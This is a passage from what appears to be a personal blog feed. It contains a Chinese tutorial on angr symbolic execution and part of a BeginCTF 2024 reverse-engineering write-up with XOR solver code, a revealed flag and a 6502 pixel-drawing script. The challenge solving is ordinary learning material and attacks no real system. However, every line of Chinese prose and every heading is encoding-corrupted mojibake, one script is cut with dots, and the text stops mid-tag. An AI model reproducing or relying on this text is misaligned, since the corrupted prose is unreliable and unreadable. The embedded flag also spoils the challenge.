again&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºç¨å¾®å¤æ‚äº†é‚£ä¹ˆä¸€ç‚¹ã€‚ä½†æ˜¯è¿™ä¸æ˜¯é—®é¢˜ï¼Œæˆ‘ä»¬ç…§ç€è§£å†³ä¸Šä¸€ä¸ªç¨‹åºçš„æ–¹æ³•ï¼Œå…ˆçœ‹çœ‹</p><p>user_input éƒ½ç»å†äº†ä»€ä¹ˆï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233010717.png" alt="image-20240216233010717"></p><p>ä¸éš¾çœ‹å‡ºï¼Œ user_input ç»å†äº†ä¸ªä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶ï¼Œæ‰€ä»¥è¿™å›æˆ‘ä»¬ä¸ºäº†å¾—å‡ºè¾“å‡ºæˆåŠŸçš„æ¡ä»¶ï¼Œæˆ‘ä»¬å¾—è§£ä¸€</p><p>ä¸ªæ–¹ç¨‹ç»„ï¼š<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233023177.png" alt="image-20240216233023177"></p><p>ä¸éš¾å‘ç°ï¼Œå°±ç®— if è¯­å¥å†å¤šï¼Œåªè¦èƒ½å¤Ÿä¸€ä¸ªä¸ªæ”¶é›†é½å…¨ï¼Œå°†è¿™äº›æ¡ä»¶å½¢æˆä¸€ä¸ªï¼ˆä¸ï¼‰ç­‰å¼ç»„ï¼Œç„¶åè§£å‡º</p><p>è¿™ä¸ªï¼ˆä¸ï¼‰ç­‰å¼ç»„ï¼Œå°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„è¾“å‡ºäº†ã€‚</p><p>ä½†æ˜¯ç°å®ç”Ÿæ´»ä¸­çš„ç¨‹åºä¸å¯èƒ½è¿™ä¹ˆç®€å•ï¼Œå•å‡­äººåŠ›æ˜¯æ— æ³•æ”¶é›†å…¨çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‡ªç„¶æ˜¯è¦ç”¨ç¨‹åºæ¥æ”¶é›†ã€‚</p><p>è¿™ä¸ªæ—¶å€™å°±è¯¥æˆ‘ä»¬çš„ angr ç™»åœºäº†ã€‚</p><p>angr ä½œä¸ºä¸€ä¸ªäºŒè¿›åˆ¶åˆ†æçš„å·¥å…·åŒ…ï¼Œä½†å®ƒé€šå¸¸ä½œä¸ºç¬¦å·æ‰§è¡Œå·¥å…·æ›´ä¸ºå‡ºåã€‚</p><p>ç¬¦å·æ‰§è¡Œå°±æ˜¯ç»™ç¨‹åºä¼ é€’ä¸€ä¸ªç¬¦å·è€Œä¸æ˜¯å…·ä½“çš„å€¼ï¼Œè®©è¿™ä¸ªç¬¦å·ä¼´éšç¨‹åºè¿è¡Œï¼Œå½“ç¢°è§åˆ†æ”¯æ—¶ï¼Œç¬¦å·ä¼š</p><p>è¿›å…¥å“ªä¸ªåˆ†æ”¯å‘¢ï¼Ÿ</p><p>angr çš„å›ç­”æ˜¯å…¨éƒ½è¿›å…¥ã€‚angr ä¼šä¿å­˜æ‰€æœ‰åˆ†æ”¯ï¼Œä»¥åŠåˆ†æ”¯åçš„æ‰€æœ‰åˆ†æ”¯ï¼Œå¹¶ä¸”åœ¨åˆ†æ”¯æ—¶ï¼Œä¿å­˜è¿›å…¥è¯¥</p><p>åˆ†æ”¯æ—¶çš„åˆ¤æ–­æ¡ä»¶ï¼Œé€šå¸¸è¿™äº›åˆ¤æ–­æ¡ä»¶æ—¶å¯¹ç¬¦å·çš„çº¦æŸã€‚</p><p>å½“ angr è¿è¡Œåˆ°ç›®æ ‡çŠ¶æ€æ—¶ï¼Œå°±å¯ä»¥è°ƒç”¨æ±‚è§£å™¨å¯¹ä¸€è·¯ä¸Šæ”¶é›†åˆ°çš„çº¦æŸè¿›è¡Œæ±‚è§£ï¼Œæœ€ç»ˆå¾—åˆ°æŸä¸ªç¬¦å·èƒ½</p><p>å¤Ÿåˆ°è¾¾å½“å‰çŠ¶æ€çš„å€¼ã€‚</p><h2 id="angr-æ ¸å¿ƒæ¦‚å¿µ"><a href="#angr-æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="angr æ ¸å¿ƒæ¦‚å¿µ"></a><strong>angr</strong> <strong>æ ¸å¿ƒæ¦‚å¿µ</strong></h2><h3 id="é¡¶å±‚æ¥å£"><a href="#é¡¶å±‚æ¥å£" class="headerlink" title="é¡¶å±‚æ¥å£"></a><strong>é¡¶å±‚æ¥å£</strong></h3><p>Project ç±»æ˜¯ angr çš„ä¸»ç±»ï¼Œä¹Ÿæ˜¯ angr çš„å¼€å§‹ï¼Œé€šè¿‡åˆå§‹åŒ–è¯¥ç±»çš„å¯¹è±¡ï¼Œå¯ä»¥å°†ä½ æƒ³è¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡</p><p>ä»¶åŠ è½½è¿›æ¥ï¼Œå°±åƒè¿™æ ·ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&quot;./test&quot;</span>)</span><br></pre></td></tr></table></figure><p>å‚æ•°ä¸ºå¾…åˆ†æçš„æ–‡ä»¶è·¯å¾„ï¼Œå®ƒæ˜¯å”¯ä¸€å¿…é¡»ä¼ å…¥çš„å‚æ•°ï¼Œæ­¤å¤–è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„å‚æ•° load-optionsï¼Œå®ƒ</p><p>æŒ‡æ˜åŠ è½½çš„æ–¹å¼ï¼Œå¦‚ä¸‹</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233058337.png" alt="image-20240216233058337"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233105524.png" alt="image-20240216233105524"></p><h3 id="State"><a href="#State" class="headerlink" title="State"></a><strong>State</strong></h3><p>Project å®é™…ä¸Šåªæ˜¯å°†äºŒè¿›åˆ¶æ–‡ä»¶åŠ è½½è¿›æ¥äº†ï¼Œè¦æ‰§è¡Œå®ƒï¼Œå®é™…ä¸Šæ˜¯å¯¹ SimState å¯¹è±¡è¿›è¡Œæ“ä½œï¼Œå®ƒæ˜¯ç¨‹</p><p>åºçš„çŠ¶æ€ã€‚</p><p>è¦åˆ›å»ºçŠ¶æ€ï¼Œéœ€è¦ä½¿ç”¨ Project å¯¹è±¡ä¸­çš„ factoryï¼Œå®ƒè¿˜å¯ä»¥ç”¨äºåˆ›å»ºæ¨¡æ‹Ÿç®¡ç†å™¨å’ŒåŸºæœ¬å—ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state = p.factory.entry_state()</span><br></pre></td></tr></table></figure><p>é¢„è®¾çŠ¶æ€æœ‰å››ç§æ–¹å¼å¦‚ä¸‹ï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233150939.png" alt="image-20240216233150939"></p><p>çŠ¶æ€åŒ…å«äº†ç¨‹åºè¿è¡Œæ—¶çš„ä¸€åˆ‡ä¿¡æ¯ï¼Œå¯„å­˜å™¨ã€å†…å­˜çš„å€¼ã€æ–‡ä»¶ç³»ç»Ÿä»¥åŠ<strong>ç¬¦å·å˜é‡</strong>ç­‰ï¼Œè¿™äº›ä¿¡æ¯çš„ä½¿ç”¨ç­‰</p><p>ç”¨åˆ°æ—¶å†è¿›ä¸€æ­¥è¯´æ˜ã€‚</p><p>entry_state å’Œ blank_state æ˜¯å¸¸ç”¨çš„ä¸¤ç§æ–¹å¼ï¼Œåè€…é€šå¸¸ç”¨äºè·³è¿‡ä¸€äº›æå¤§é™ä½ angr æ•ˆç‡çš„æŒ‡ä»¤ï¼Œå®ƒ</p><p>ä»¬é—´çš„å¯¹æ¯”å¦‚ä¸‹ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; state = p.factory.entry_state()</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 <span class="number">0</span>x1c&gt; &lt;BV64 <span class="number">0</span>x4023c0&gt;</span><br><span class="line">&gt;&gt;&gt; state = p.factory.blank_state(addr=<span class="number">0</span>x4023c0)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 reg_rax_42_64&#123;UNINITIALIZED&#125;&gt; &lt;BV64 <span class="number">0</span>x4023c0&gt;</span><br></pre></td></tr></table></figure><p>åœ¨ blank_state æ–¹å¼ä¸­ï¼Œæˆ‘ä»¬ä»å°†åœ°å€è®¾å®šä¸ºç¨‹åºçš„å…¥å£ç‚¹ï¼Œç„¶è€Œ rax ä¸­çš„å€¼ç”±äºæ²¡æœ‰åˆå§‹åŒ–ï¼Œå®ƒç°åœ¨</p><p>æ˜¯ä¸€ä¸ªåå­—ï¼Œä¹Ÿå³ç¬¦å·å˜é‡ï¼Œè¿™æ˜¯ç¬¦å·æ‰§è¡Œçš„åŸºç¡€ã€‚æ­¤å¤–ï¼Œå¯ä»¥çœ‹åˆ°å¯„å­˜å™¨ä¸­çš„æ•°æ®ç±»å‹å¹¶ä¸æ˜¯ intï¼Œ</p><p>è€Œæ˜¯ BV64ï¼Œå®ƒæ˜¯ä¸€ä¸ªä½å‘é‡ï¼ˆBit Vectorï¼‰ã€‚</p><h3 id="Simulation-Manager"><a href="#Simulation-Manager" class="headerlink" title="Simulation Manager"></a><strong>Simulation Manager</strong></h3><p>ä¸Šè¿°æ–¹å¼åªæ˜¯é¢„è®¾äº†ç¨‹åºå¼€å§‹åˆ†ææ—¶çš„çŠ¶æ€ï¼Œæˆ‘ä»¬è¦åˆ†æç¨‹åºå°±å¿…é¡»è¦è®©å®ƒåˆ°è¾¾ä¸‹ä¸€ä¸ªçŠ¶æ€ï¼Œè¿™å°±éœ€è¦</p><p>æ¨¡æ‹Ÿç®¡ç†å™¨çš„å¸®åŠ©ï¼ˆç®€ç§° SMï¼‰ã€‚</p><p>ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤èƒ½åˆ›å»ºä¸€ä¸ª SMï¼Œå®ƒéœ€è¦ä¼ å…¥ä¸€ä¸ª state æˆ–è€… state çš„åˆ—è¡¨ä½œä¸ºå‚æ•°ï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233228867.png" alt="image-20240216233228867"></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œstate ä¼šè¢«å­˜æ”¾åœ¨ active ä¸­ã€‚</p><p>å¯ä»¥é€šè¿‡ step() æ–¹æ³•æ¥è®©å¤„äº active çš„ state æ‰§è¡Œä¸€ä¸ªåŸºæœ¬å—ï¼Œè¿™ç§æ“ä½œä¸ä¼šæ”¹å˜ state æœ¬èº«ï¼ˆç±»æ¯”</p><p>dockerï¼‰ï¼š<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216233245331.png" alt="image-20240216233245331"></p><h3 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a><strong>Explorer</strong></h3><p>å¯ä»¥ä½¿ç”¨ explorer æ–¹æ³•å»æ‰§è¡ŒæŸä¸ªçŠ¶æ€ï¼Œç›´åˆ°æ‰¾åˆ°ç›®æ ‡æŒ‡ä»¤æˆ–è€… active ä¸­æ²¡æœ‰çŠ¶æ€ä¸ºæ­¢ï¼Œå®ƒæœ‰å¦‚ä¸‹å‚</p><p>æ•°ï¼š</p><p>findï¼šä¼ å…¥ç›®æ ‡æŒ‡ä»¤çš„åœ°å€æˆ–åœ°å€åˆ—è¡¨ï¼Œæˆ–è€…ä¸€ä¸ªç”¨äºåˆ¤æ–­çš„å‡½æ•°</p><p>avoidï¼šä¼ å…¥è¦é¿å…çš„æŒ‡ä»¤çš„åœ°å€æˆ–åœ°å€åˆ—è¡¨ï¼Œæˆ–è€…ä¸€ä¸ªç”¨äºåˆ¤æ–­çš„å‡½æ•°ï¼Œç”¨äºå‡å°‘è·¯å¾„</p><p>angr ä¼šæ²¿ç€åˆ†æ”¯æŒ‰ç…§æŸç§ç­–ç•¥ï¼ˆé»˜è®¤DFSï¼‰è¿›è¡ŒçŠ¶æ€æœç´¢ï¼Œå½“è¾¾åˆ°ç›®æ ‡çŠ¶æ€æ—¶ï¼Œä½¿ç”¨çº¦æŸæ±‚è§£å™¨</p><p>ï¼ˆclaripyï¼‰å¯¹æ”¶é›†åˆ°çš„çº¦æŸè¿›è¡Œæ±‚è§£ã€‚</p><p>å› æ­¤ï¼Œä½¿ç”¨ angr ä¸€èˆ¬åˆ†ä¸ºå¦‚ä¸‹æ­¥éª¤ï¼š</p><p>\1. åˆ›å»º Projectï¼Œé¢„è®¾ state</p><p>\2. åˆ›å»ºä½å‘é‡å’Œç¬¦å·å˜é‡ï¼Œä¿å­˜åœ¨å†…å­˜&#x2F;å¯„å­˜å™¨&#x2F;æ–‡ä»¶æˆ–å…¶ä»–åœ°æ–¹</p><p>\3. å°† state æ·»åŠ åˆ° SM ä¸­</p><p>\4. è¿è¡Œï¼Œæ¢ç´¢æ»¡è¶³æ¡ä»¶çš„è·¯å¾„</p><p>\5. çº¦æŸæ±‚è§£è·å–æ‰§è¡Œç»“æœ</p><h2 id="angr-å…¥é—¨ç»ƒä¹ "><a href="#angr-å…¥é—¨ç»ƒä¹ " class="headerlink" title="angr å…¥é—¨ç»ƒä¹ "></a><strong>angr</strong> <strong>å…¥é—¨ç»ƒä¹ </strong></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¬¦å·æ‰§è¡Œæ¡†æ¶&quot;&gt;&lt;a href=&quot;#ç¬¦å·æ‰§è¡Œæ¡†æ¶&quot; class=&quot;headerlink&quot; title=&quot;ç¬¦å·æ‰§è¡Œæ¡†æ¶&quot;&gt;&lt;/a&gt;ç¬¦å·æ‰§è¡Œæ¡†æ¶&lt;/h1&gt;&lt;h2 id=&quot;ç¬¦å·æ‰§è¡Œä»‹ç»&quot;&gt;&lt;a href=&quot;#ç¬¦å·æ‰§è¡Œä»‹ç»&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="RE" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>BeginCTF 2024å†¬</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/09/BeginCTF2024/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/09/BeginCTF2024/</id>
    <published>2024-02-08T16:00:00.000Z</published>
    <updated>2024-02-23T14:34:13.237Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BeginCTF-2024å†¬"><a href="#BeginCTF-2024å†¬" class="headerlink" title="BeginCTF 2024å†¬"></a>BeginCTF 2024å†¬</h1><p>å†™çš„é¢˜ä¸å¤šï¼Œä»å¸ˆå‚…ä»¬å†™çš„ç‰¹åˆ«å¥½çš„wpä»¬å­¦åˆ°äº†å¾ˆå¤šï¼Œ</p><p>ä»¥ä¸‹æ˜¯å­¦ä¹ å¤ç°åçš„ä¸€äº›ç¬”è®°</p><p>å‚è€ƒäº†å¾ˆå¤šå¸ˆå‚…çš„æ–‡ç« ï¼š</p><p><a href="https://hjug69b9j6.feishu.cn/docx/V02Rd3MyWoRPVxxTTCOcLutNnqe">å®˜æ–¹wp</a></p><p><a href="http://t.csdnimg.cn/jCdia">ç›´æ¥å†™äº†å¾ˆå¤šä¸ä¼šçš„é¢˜çš„é¢˜è§£</a></p><p><a href="https://www.hbailu.top/index.php/archives/131">è¿™å“¥ä»¬æ€è·¯å›¾éå¸¸å¥½ï¼Œå€Ÿé‰´</a></p><p><a href="https://yurogod.github.io/ctf/events/BeginCTF-2024/">é™¤å¯†ç çš„å…¨èƒ½å¸ˆå‚…</a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p><a href="https://hw6vk9v66q.feishu.cn/docx/UIm5dwwbzo4O6IxALeZcpXdCnDh">é¢˜ç›®é™„ä»¶</a></p><h3 id="real-checkin-xor"><a href="#real-checkin-xor" class="headerlink" title="real checkin xor"></a><strong>real checkin xor</strong></h3><p>è¿™é“é¢˜æ˜¯ï¼Œå› ä¸ºç­¾åˆ°é€†å‘é¢˜æœ‰ç‚¹éš¾ï¼Œå‡ºé¢˜å¸ˆå‚…åˆå‡ºçš„çœŸçœŸç­¾åˆ°é¢˜ï¼Œç¡®å®ä¸éš¾ã€‚</p><p>ç›´æ¥ç»™çš„å°±æ˜¯ä»£ç </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">verify_func</span>(<span class="params">ciper,key</span>):</span><br><span class="line">    encrypted = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciper)):</span><br><span class="line">        encrypted.append(<span class="built_in">ord</span>(ciper[i])^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)]))</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line">secret = [<span class="number">7</span>, <span class="number">31</span>, <span class="number">56</span>, <span class="number">25</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">91</span>, <span class="number">21</span>, <span class="number">49</span>, <span class="number">15</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">48</span>, <span class="number">60</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">86</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">23</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">59</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">39</span>, <span class="number">45</span>, <span class="number">23</span>, <span class="number">102</span>, <span class="number">27</span>, <span class="number">11</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">24</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;è¿™æ˜¯ä¸€ä¸ªä¿é™©ç®±,ä½ èƒ½è¾“å…¥ç›¸å…³çš„keyæ¥è¿›è¡Œè§£å¯†å—?&quot;</span>)</span><br><span class="line">input_line = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥key &gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> verify_func(input_line,<span class="string">&quot;ez_python_xor_reverse&quot;</span>) == secret:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å¯†ç æ­£ç¡®&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å¯†ç é”™è¯¯&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240206205429012.png" alt="image-20240206205429012"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> a[<span class="number">100</span>]=&#123; <span class="number">7</span>, <span class="number">31</span>, <span class="number">56</span>, <span class="number">25</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">91</span>, <span class="number">21</span>, </span><br><span class="line"><span class="number">49</span>, <span class="number">15</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">48</span>, <span class="number">60</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">86</span>, <span class="number">36</span>, </span><br><span class="line"><span class="number">64</span>, <span class="number">23</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">59</span>, <span class="number">38</span>, </span><br><span class="line"><span class="number">108</span>, <span class="number">39</span>, <span class="number">45</span>, <span class="number">23</span>, <span class="number">102</span>, <span class="number">27</span>, <span class="number">11</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">24</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> key[<span class="number">100</span>]=&#123;<span class="string">&quot;ez_python_xor_reverse&quot;</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[i]^key[i%<span class="built_in">strlen</span>(key)]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//begin&#123;3z_PY7hoN_r3V3rSE_For_TH3_Be9inNEr!&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_func</span>(<span class="params">encrypted, key</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)):</span><br><span class="line">        decrypted.append(<span class="built_in">chr</span>(encrypted[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;ez_python_xor_reverse&quot;</span></span><br><span class="line">ciper = [<span class="number">7</span>, <span class="number">31</span>, <span class="number">56</span>, <span class="number">25</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">91</span>, <span class="number">21</span>, <span class="number">49</span>, <span class="number">15</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">48</span>, <span class="number">60</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">86</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">23</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">59</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">39</span>, <span class="number">45</span>, <span class="number">23</span>, <span class="number">102</span>, <span class="number">27</span>, <span class="number">11</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line">decrypted_text = decrypt_func(ciper, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;è§£å¯†åçš„æ–‡æœ¬:&quot;</span>, decrypted_text)</span><br></pre></td></tr></table></figure><h3 id="çº¢ç™½æœº"><a href="#çº¢ç™½æœº" class="headerlink" title="çº¢ç™½æœº"></a>çº¢ç™½æœº</h3><p>è¦æ³¨æ„ä¸‹è½½çš„æ–‡ä»¶åå‘œå‘œ</p><p><a href="https://wusiyu.me/6502-cpu%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%8C%87%E4%BB%A4%E9%9B%86/#zhi_ling_ji">æŒ‡ä»¤é›†</a></p><h4 id="6502æ±‡ç¼–ç -ç›´æ¥ç¼–è¯‘è¿è¡Œ"><a href="#6502æ±‡ç¼–ç -ç›´æ¥ç¼–è¯‘è¿è¡Œ" class="headerlink" title="# 6502æ±‡ç¼–ç    ç›´æ¥ç¼–è¯‘è¿è¡Œ"></a># 6502æ±‡ç¼–ç    ç›´æ¥ç¼–è¯‘è¿è¡Œ</h4><p><a href="https://codediy.github.io/nes-zh/easy6502/index.html">Easy 6502</a></p><h4 id="æˆ–è€…è‡ªå·±æ‰‹æ“"><a href="#æˆ–è€…è‡ªå·±æ‰‹æ“" class="headerlink" title="æˆ–è€…è‡ªå·±æ‰‹æ“"></a>æˆ–è€…è‡ªå·±æ‰‹æ“</h4><p>åç§»ä¸º0x200ï¼Œé»‘è‰²åœ°æ–¹æå–ç”»å›¾</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">screen = [[<span class="number">0</span>] * <span class="number">32</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addr_to_coords</span>(<span class="params">addr</span>):</span><br><span class="line">    addr -= <span class="number">0x200</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">divmod</span>(addr, <span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> base <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x200</span>, <span class="number">0x600</span>, <span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFF</span>):</span><br><span class="line">        row, col = addr_to_coords(base + offset)</span><br><span class="line">        screen[row][col] = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">ops = [</span><br><span class="line">    (<span class="number">0x201</span>, <span class="number">0</span>), (<span class="number">0x202</span>, <span class="number">0</span>), (<span class="number">0x221</span>, <span class="number">0</span>), (<span class="number">0x240</span>, <span class="number">0</span>), (<span class="number">0x241</span>, <span class="number">0</span>), (<span class="number">0x242</span>, <span class="number">0</span>), (<span class="number">0x261</span>, <span class="number">0</span>), (<span class="number">0x281</span>, <span class="number">0</span>),</span><br><span class="line">    (<span class="number">0x204</span>, <span class="number">0</span>), (<span class="number">0x224</span>, <span class="number">0</span>), (<span class="number">0x244</span>, <span class="number">0</span>), (<span class="number">0x264</span>, <span class="number">0</span>), (<span class="number">0x284</span>, <span class="number">0</span>), (<span class="number">0x246</span>, <span class="number">0</span>), (<span class="number">0x247</span>, <span class="number">0</span>), (<span class="number">0x248</span>, <span class="number">0</span>),</span><br><span class="line">..........................</span><br><span class="line">..........................</span><br><span class="line"> </span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> addr, val <span class="keyword">in</span> ops:</span><br><span class="line">    row, col = addr_to_coords(addr)</span><br><span class="line">    screen[row][col] = val</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> screen:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="string">&#x27;   &#x27;</span> <span class="keyword">if</span> pixel <span class="keyword">else</span> <span class="string">&#x27; * &#x27;</span> <span class="keyword">for</span> pixel <span class="keyword">in</span> row))</span><br></pre></td></tr></table></figure><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a><strong>xor</strong></h3><p>upxå£³+åè°ƒè¯•</p><blockquote><p>rdataæ®µï¼šç”¨äºä»è¿œç¨‹æœåŠ¡å™¨è·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´çš„å‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œé€šå¸¸ç”¨äºUNIXç±»æ“ä½œç³»ç»Ÿä»¥å°†ç³»ç»Ÿæ—¶é’Ÿä¸è¿œç¨‹æ—¶é—´æœåŠ¡å™¨åŒæ­¥ã€‚</p></blockquote><h4 id="èµ°å¼¯è·¯åšæ³•ï¼šåˆ†æåŠ å¯†åŸç†ï¼Œæ‰¾é™æ€èµ„æº"><a 